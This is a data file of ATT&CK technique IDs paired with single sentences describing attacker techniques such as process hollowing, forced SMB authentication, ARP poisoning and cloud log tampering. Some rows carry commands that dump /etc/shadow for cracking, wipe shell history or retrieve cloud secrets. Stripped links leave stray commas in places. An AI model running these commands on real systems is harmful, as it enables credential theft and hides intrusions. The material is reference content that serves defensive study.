11076,T1122,T1122,Component Object Model Hijacking,When that system component is executed through normal system operation the adversary's code will be executed instead.
11077,T1122,T1122,Component Object Model Hijacking,"An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection."
11078,T1015,T1015,Accessibility Features,"Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements."
11079,T1015,T1015,Accessibility Features,The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.
11080,T1015,T1015,Accessibility Features,"Examples for both methods:
For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program  may be replaced with ""cmd.exe"" ."
11081,T1015,T1015,Accessibility Features,"For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for the accessibility program ."
11082,T1015,T1015,Accessibility Features,"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the ""debugger"" program to be executed with SYSTEM privileges."

12121,T1055,T1055.012,Process Hollowing,Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
12122,T1055,T1055.012,Process Hollowing,"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code."
12123,T1055,T1055.012,Process Hollowing,"A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread."
12124,T1055,T1055.012,Process Hollowing,"At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively."
12125,T1055,T1055.012,Process Hollowing,"This is very similar to Thread Local Storage, but creates a new process rather than targeting an existing process."
12126,T1055,T1055.012,Process Hollowing,"However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process."

12509,T1187,T1187,Forced Authentication,Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.
12510,T1187,T1187,Forced Authentication,The Server Message Block  protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing.
12511,T1187,T1187,Forced Authentication,When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.
12512,T1187,T1187,Forced Authentication,This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.
12513,T1187,T1187,Forced Authentication,Web Distributed Authoring and Versioning  is also typically used by Windows systems as a backup protocol when SMB is blocked or fails.
12514,T1187,T1187,Forced Authentication,WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.
12515,T1187,T1187,Forced Authentication,Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication.
12516,T1187,T1187,Forced Authentication,"An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  Template Injection,, or place a specially crafted file on navigation path for privileged accounts  or on a publicly accessible share to be accessed by victim."
12517,T1187,T1187,Forced Authentication,"When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server."
12518,T1187,T1187,Forced Authentication,"With access to the credential hash, an adversary can perform off-line Brute Force, cracking to gain access to plaintext credentials."
12519,T1187,T1187,Forced Authentication,There are several different ways this can occur.
12520,T1187,T1187,Forced Authentication,"Some specifics from in-the-wild use include:
* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened  Template Injection,."
12521,T1187,T1187,Forced Authentication,"The document can include, for example, a request similar to file:,//remote address,/Normal.dotm to trigger the SMB request."
12522,T1187,T1187,Forced Authentication,"* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\remote address,\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials."
12523,T1187,T1187,Forced Authentication,"EnvyScout, can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure."

12528,T1134,T1134.005,SID-History Injection,Adversaries may use SID-History Injection to escalate privileges and bypass access controls.
12529,T1134,T1134.005,SID-History Injection,"This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services,, SMB/Windows Admin Shares,, or Windows Remote Management,."
12530,T1599,T1599,Network Boundary Bridging,Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation.
12531,T1599,T1599,Network Boundary Bridging,Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
12532,T1599,T1599,Network Boundary Bridging,Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.
12533,T1599,T1599,Network Boundary Bridging,They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.
12534,T1599,T1599,Network Boundary Bridging,"Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications."
12535,T1599,T1599,Network Boundary Bridging,"To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised."
12536,T1599,T1599,Network Boundary Bridging,"When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance."
12537,T1599,T1599,Network Boundary Bridging,"By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy, or exfiltration of data via Traffic Duplication,."
12538,T1599,T1599,Network Boundary Bridging,"Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy, to achieve the same goals."
12539,T1599,T1599,Network Boundary Bridging,"In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments."

13097,T1168,T1168,Local Job Scheduling,"### cron
System-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files."
13098,T1168,T1168,Local Job Scheduling,This works on macOS and Linux systems.
13099,T1168,T1168,Local Job Scheduling,"Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction."
13100,T1168,T1168,Local Job Scheduling,"An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence,     to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account."
13101,T1168,T1168,Local Job Scheduling,"### at
The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes."
13102,T1168,T1168,Local Job Scheduling,"### launchd
Each launchd job is described by a different configuration property list  file similar to Launch Daemon, or Launch Agent,, except there is an additional key called StartCalendarInterval with a dictionary of time values."

13104,T1166,T1166,Setuid and Setgid,"When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  ."
13105,T1166,T1166,Setuid and Setgid,"There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges."
13106,T1166,T1166,Setuid and Setgid,"Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications."
13107,T1166,T1166,Setuid and Setgid,"These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 file, or via shorthand naming, chmod u+s file,."
13108,T1166,T1166,Setuid and Setgid,An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context.
13109,T1166,T1166,Setuid and Setgid,"Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  ."
13110,T1037,T1037.005,Startup Items,Adversaries may use startup items automatically executed at boot initialization to establish persistence.
13111,T1037,T1037.005,Startup Items,Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.
13112,T1037,T1037.005,Startup Items,"This is technically a deprecated technology , and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra."
13113,T1037,T1037.005,Startup Items,An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.
13114,T1037,T1037.005,Startup Items,"Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user."
13115,T1037,T1037.005,Startup Items,"jRAT, can list and manage startup entries."
13116,T1100,T1100,Web Shell,A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.
13117,T1100,T1100,Web Shell,"In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server ."
13118,T1100,T1100,Web Shell,"Web shells may serve as Redundant Access, or as a persistence mechanism in case an adversary's primary access methods are detected and removed."
13119,T1100,T1100,Web Shell,"By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely."
13120,T1100,T1100,Web Shell,"This shell can have various capabilities, thereby acting as a ""gateway"" to the underlying web server."
13121,T1100,T1100,Web Shell,"The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels."
13122,T1100,T1100,Web Shell,"APT34 has frequently used Web shells, often to maintain access to a victim network."
13123,T1100,T1100,Web Shell,Dragonfly used Web shells to maintain access to a victim network and download additional malicious files.
13124,T1186,T1186,Process Doppelgänging,"Adversaries may leverage TxF to a perform a file-less variation of Process Injection, called Process Doppelgänging."
13125,T1186,T1186,Process Doppelgänging,"Similar to Process Hollowing,, Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection."
13126,T1186,T1186,Process Doppelgänging,"Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext."
13127,T1184,T1184,SSH Hijacking,Compromising the SSH agent also provides access to intercept SSH credentials.
13128,T1184,T1184,SSH Hijacking,"SSH Hijacking, differs from use of Remote Services, because it injects into an existing SSH session rather than creating a new session using Valid Accounts,."
13129,T1184,T1184,SSH Hijacking,"Ebury, has hijacked the OpenSSH process by injecting into the existing session as opposed to creating a new session."
13130,T1614,T1614.001,System Language Discovery,Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host.
13131,T1614,T1614.001,System Language Discovery,"This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions."
13132,T1614,T1614.001,System Language Discovery,This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.

13633,T1578,T1578.005,Modify Cloud Compute Configurations,"These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute."
13634,T1578,T1578.005,Modify Cloud Compute Configurations,"Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim."
13635,T1578,T1578.005,Modify Cloud Compute Configurations,"For example, cloud providers often limit customer usage of compute resources via quotas."
13636,T1578,T1578.005,Modify Cloud Compute Configurations,"Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider."
13637,T1578,T1578.005,Modify Cloud Compute Configurations,"Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking, without raising suspicion by using up a victim’s entire quota."
13638,T1578,T1578.005,Modify Cloud Compute Configurations,Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.
13639,T1578,T1578.005,Modify Cloud Compute Configurations,"Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions,."
13640,T1578,T1578.005,Modify Cloud Compute Configurations,"In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant."
13641,T1578,T1578.005,Modify Cloud Compute Configurations,This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.
13642,T1088,T1088,Bypass User Account Control,Windows User Account Control  allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation.
13643,T1088,T1088,Bypass User Account Control,"If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box."
13644,T1088,T1088,Bypass User Account Control,An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access.
13645,T1088,T1088,Bypass User Account Control,Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.
13646,T1088,T1088,Bypass User Account Control,"The Github readme page for UACMe contains an extensive list of methods  that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses."
13647,T1088,T1088,Bypass User Account Control,"Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity."
13648,T1494,T1494,Runtime Data Manipulation,Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.
13649,T1090,T1090.004,Domain Fronting,Adversaries may take advantage of routing schemes in Content Delivery Networks  and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.
13650,T1090,T1090.004,Domain Fronting,Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header.
13651,T1090,T1090.004,Domain Fronting,"Cobalt Strike, has the ability to accept a value for HTTP Host Header to enable domain fronting."
13652,T1090,T1090.004,Domain Fronting,"SMOKEDHAM, has used a fronted domain to obfuscate its hard-coded C2 server domain."

13654,T1557,T1557.002,ARP Cache Poisoning,Adversaries may poison Address Resolution Protocol  caches to position themselves between the communication of two or more networked devices.
13655,T1557,T1557.002,ARP Cache Poisoning,"This activity may be used to enable follow-on behaviors such as Network Sniffing, or Transmitted Data Manipulation,."
13656,T1557,T1557.002,ARP Cache Poisoning,"The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control  address."
13657,T1557,T1557.002,ARP Cache Poisoning,Devices in a local network segment communicate with each other by using link layer addresses.
13658,T1557,T1557.002,ARP Cache Poisoning,"If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address."
13659,T1557,T1557.002,ARP Cache Poisoning,The device with the associated IP address directly replies with its MAC address.
13660,T1557,T1557.002,ARP Cache Poisoning,The networked device that made the ARP request will then use as well as store that information in its ARP cache.
13661,T1557,T1557.002,ARP Cache Poisoning,An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device.
13662,T1557,T1557.002,ARP Cache Poisoning,"The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device."
13663,T1557,T1557.002,ARP Cache Poisoning,"For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner."
13664,T1557,T1557.002,ARP Cache Poisoning,Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.
13665,T1557,T1557.002,ARP Cache Poisoning,The ARP protocol is stateless and does not require authentication.
13666,T1557,T1557.002,ARP Cache Poisoning,"Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache."
13667,T1557,T1557.002,ARP Cache Poisoning,Adversaries may use ARP cache poisoning as a means to intercept network traffic.
13668,T1557,T1557.002,ARP Cache Poisoning,"This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol."
13669,T1557,T1557.002,ARP Cache Poisoning,"Cleaver, has used custom tools to facilitate ARP cache poisoning."
13670,T1557,T1557.002,ARP Cache Poisoning,"LuminousMoth, has used ARP spoofing to redirect a compromised machine to an actor-controlled website."
13671,T1562,T1562.008,Disable or Modify Cloud Logs,An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection.
13672,T1562,T1562.008,Disable or Modify Cloud Logs,Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment.
13673,T1562,T1562.008,Disable or Modify Cloud Logs,"If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities."
13674,T1562,T1562.008,Disable or Modify Cloud Logs,"For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity."
13675,T1562,T1562.008,Disable or Modify Cloud Logs,"They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files."
13676,T1562,T1562.008,Disable or Modify Cloud Logs,"In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license."

13963,T1556,T1556.009,Conditional Access Policies,Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts.
13964,T1556,T1556.009,Conditional Access Policies,Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.
13965,T1556,T1556.009,Conditional Access Policies,"For example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication."
13966,T1556,T1556.009,Conditional Access Policies,"In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators."
13967,T1556,T1556.009,Conditional Access Policies,"In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested."
13968,T1556,T1556.009,Conditional Access Policies,"These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required."
13969,T1556,T1556.009,Conditional Access Policies,"By modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication, requirements, or allowing additional Unused/Unsupported Cloud Regions,, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures."
13970,T1556,T1556.009,Conditional Access Policies,"Scattered Spider, has added additional trusted locations to Azure AD conditional access policies."
13971,T1578,T1578.002,Create Cloud Instance,An adversary may create a new instance or virtual machine  within the compute service of a cloud account to evade defenses.
13972,T1578,T1578.002,Create Cloud Instance,Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account.
13973,T1578,T1578.002,Create Cloud Instance,"An adversary may Create Snapshot, of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System, or for Remote Data Staging,."
13974,T1578,T1578.002,Create Cloud Instance,Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.
13975,T1578,T1578.002,Create Cloud Instance,"LAPSUS$, has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets."

13978,T1500,T1500,Compile After Delivery,"Similar to Obfuscated Files or Information,, text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries."
13979,T1500,T1500,Compile After Delivery,"Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Spearphishing Attachment,."
13980,T1555,T1555.006,Cloud Secrets Management Stores,"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault."
13981,T1555,T1555.006,Cloud Secrets Management Stores,"Secrets managers support the secure centralized management of passwords, API keys, and other credential material."
13982,T1555,T1555.006,Cloud Secrets Management Stores,"Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables."
13983,T1555,T1555.006,Cloud Secrets Management Stores,"If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged Cloud Accounts, or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager."
13984,T1555,T1555.006,Cloud Secrets Management Stores,"This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure."
13985,T1555,T1555.006,Cloud Secrets Management Stores,"**Note:** this technique is distinct from Cloud Instance Metadata API, in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API."
13986,T1213,T1213.003,Code Repositories,Adversaries may leverage code repositories to collect valuable information.
13987,T1213,T1213.003,Code Repositories,Code repositories are tools/services that store source code and automate software builds.
13988,T1213,T1213.003,Code Repositories,"They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket."
13989,T1213,T1213.003,Code Repositories,"Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code."
13990,T1213,T1213.003,Code Repositories,"Having access to software's source code may allow adversaries to develop Exploits,, while credentials may provide access to additional resources using Valid Accounts,."
13991,T1213,T1213.003,Code Repositories,"**Note:** This is distinct from Code Repositories,, which focuses on conducting Reconnaissance, via public code repositories."
13992,T1213,T1213.003,Code Repositories,"LAPSUS$, has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials."

14001,T1003,T1003.008,/etc/passwd and /etc/shadow,Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking.
14002,T1003,T1003.008,/etc/passwd and /etc/shadow,Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow.
14003,T1003,T1003.008,/etc/passwd and /etc/shadow,"By default, /etc/shadow is only readable by the root user."
14004,T1003,T1003.008,/etc/passwd and /etc/shadow,"The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db"
14005,T1543,T1543.001,Launch Agent,Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence.

14372,T1055,T1055.009,Proc Memory,Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges.
14373,T1055,T1055.009,Proc Memory,Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.
14374,T1055,T1055.009,Proc Memory,Proc memory injection involves enumerating the memory of a process via the /proc filesystem  then crafting a return-oriented programming  payload with available gadgets/instructions.
14375,T1055,T1055.009,Proc Memory,"Each running process has its own directory, which includes memory mappings."
14376,T1055,T1055.009,Proc Memory,Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.
14377,T1055,T1055.009,Proc Memory,This information can be used to enumerate offsets  and gadgets  otherwise hidden by process memory protections such as address space layout randomization .
14378,T1055,T1055.009,Proc Memory,"Once enumerated, the target processes’ memory map within /proc/pid,/maps can be overwritten using dd."
14379,T1055,T1055.009,Proc Memory,"Other techniques such as Dynamic Linker Hijacking, may be used to populate a target process with more available gadgets."
14380,T1055,T1055.009,Proc Memory,"Similar to Process Hollowing,, proc memory injection may target child processes ."
14381,T1055,T1055.009,Proc Memory,Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.
14382,T1223,T1223,Compiled HTML File,Compiled HTML files  are commonly distributed as part of the Microsoft HTML Help system.
14383,T1223,T1223,Compiled HTML File,Adversaries may abuse this technology to conceal malicious code.
14384,T1223,T1223,Compiled HTML File,CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe.
14385,T1650,T1650,Acquire Access,Adversaries may purchase or otherwise acquire an existing access to a target system or network.
14386,T1650,T1650,Acquire Access,A variety of online services and initial access broker networks are available to sell access to previously compromised systems.
14387,T1650,T1650,Acquire Access,"In some cases, adversary groups may form partnerships to share compromised systems with each other."
14388,T1650,T1650,Acquire Access,"Footholds to compromised systems may take a variety of forms, such as access to planted backdoors  or established access via External Remote Services,."
14389,T1650,T1650,Acquire Access,"In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers."
14390,T1650,T1650,Acquire Access,"By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise."
14391,T1650,T1650,Acquire Access,"Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector."
14392,T1650,T1650,Acquire Access,"In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship,, Multi-Factor Authentication Interception,, or even Supply Chain Compromise,."
14393,T1650,T1650,Acquire Access,"**Note:** while this technique is distinct from other behaviors such as Purchase Technical Data, and Credentials,, they may often be used in conjunction ."
14394,T1601,T1601.001,Patch System Image,Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.
14395,T1601,T1601.001,Patch System Image,"Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file."
14396,T1601,T1601.001,Patch System Image,"Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime."
14397,T1601,T1601.001,Patch System Image,"To change the operating system in storage, the adversary will typically use the standard procedures available to device operators."
14398,T1601,T1601.001,Patch System Image,"This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection."
14399,T1601,T1601.001,Patch System Image,"The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image."
14400,T1601,T1601.001,Patch System Image,"To change the operating system in memory, the adversary typically can use one of two methods."
14401,T1601,T1601.001,Patch System Image,"In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system."
14402,T1601,T1601.001,Patch System Image,This method typically requires administrative level access to the device.
14403,T1601,T1601.001,Patch System Image,"In the second method for changing the operating system in memory, the adversary would make use of the boot loader."
14404,T1601,T1601.001,Patch System Image,"The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system."
14405,T1601,T1601.001,Patch System Image,"Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit, method, to directly manipulate running operating system code in memory."
14406,T1601,T1601.001,Patch System Image,"This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime."
14407,T1601,T1601.001,Patch System Image,"By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before."
14408,T1601,T1601.001,Patch System Image,"Examples of existing defenses that can be impeded include encryption, via Weaken Encryption,, authentication, via Network Device Authentication,, and perimeter defenses, via Network Boundary Bridging,."
14409,T1601,T1601.001,Patch System Image,"Adding new capabilities for the adversary’s purpose include Keylogging,, Multi-hop Proxy,, and Port Knocking,."
14410,T1601,T1601.001,Patch System Image,Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.
14411,T1601,T1601.001,Patch System Image,"When this method is used in conjunction with Downgrade System Image,, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system."
14412,T1601,T1601.001,Patch System Image,"By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade."
14413,T1601,T1601.001,Patch System Image,"When the operating system is patched in storage, this can be achieved in either the resident storage  or via TFTP Boot,."
14414,T1601,T1601.001,Patch System Image,"When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots."
14415,T1601,T1601.001,Patch System Image,"However, live memory modification of the operating system can be combined with ROMMONkit, to achieve persistence."
14416,T1601,T1601.001,Patch System Image,"SYNful Knock, is malware that is inserted into a network device by patching the operating system image."
14417,T1558,T1558.002,Silver Ticket,"Adversaries who have the password hash of a target service account  may forge Kerberos ticket granting service  tickets, also known as silver tickets."
14418,T1558,T1558.002,Silver Ticket,Kerberos TGS tickets are also known as service tickets.
14419,T1558,T1558.002,Silver Ticket,"Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource  and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center , potentially making detection more difficult."
14420,T1558,T1558.002,Silver Ticket,"Password hashes for target services may be obtained using OS Credential Dumping, or Kerberoasting,."
14421,T1213,T1213,Data from Information Repositories,Adversaries may leverage information repositories to mine valuable information.
14422,T1213,T1213,Data from Information Repositories,"Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information."
14423,T1213,T1213,Data from Information Repositories,Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.
14424,T1213,T1213,Data from Information Repositories,"The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:
* Policies, procedures, and standards
* Physical / logical network diagrams

14442,T1146,T1146,Clear Command History,macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they've done.
14443,T1146,T1146,Clear Command History,These logs can be accessed in a few different ways.
14444,T1146,T1146,Clear Command History,"Since everything typed on the command-line is saved, passwords passed in on the command line are also saved."
14445,T1146,T1146,Clear Command History,Adversaries can abuse this by searching these files for cleartext passwords.
14446,T1146,T1146,Clear Command History,"Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history."
14447,T1555,T1555.004,Windows Credential Manager,Adversaries may acquire credentials from the Windows Credential Manager.
14448,T1555,T1555.004,Windows Credential Manager,"The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers ."
14449,T1555,T1555.004,Windows Credential Manager,The Windows Credential Manager separates website credentials from application or network credentials in two lockers.
14450,T1555,T1555.004,Windows Credential Manager,"As part of Credentials from Web Browsers,, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker."
14451,T1555,T1555.004,Windows Credential Manager,Application and network credentials are stored in the Windows Credentials locker.
14452,T1555,T1555.004,Windows Credential Manager,"Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\Username,\AppData\Local\Microsoft\\Vault/Credentials,\`."
14453,T1555,T1555.004,Windows Credential Manager,"The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials."
14454,T1555,T1555.004,Windows Credential Manager,Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.
14455,T1555,T1555.004,Windows Credential Manager,vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface.
14456,T1555,T1555.004,Windows Credential Manager,Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers.
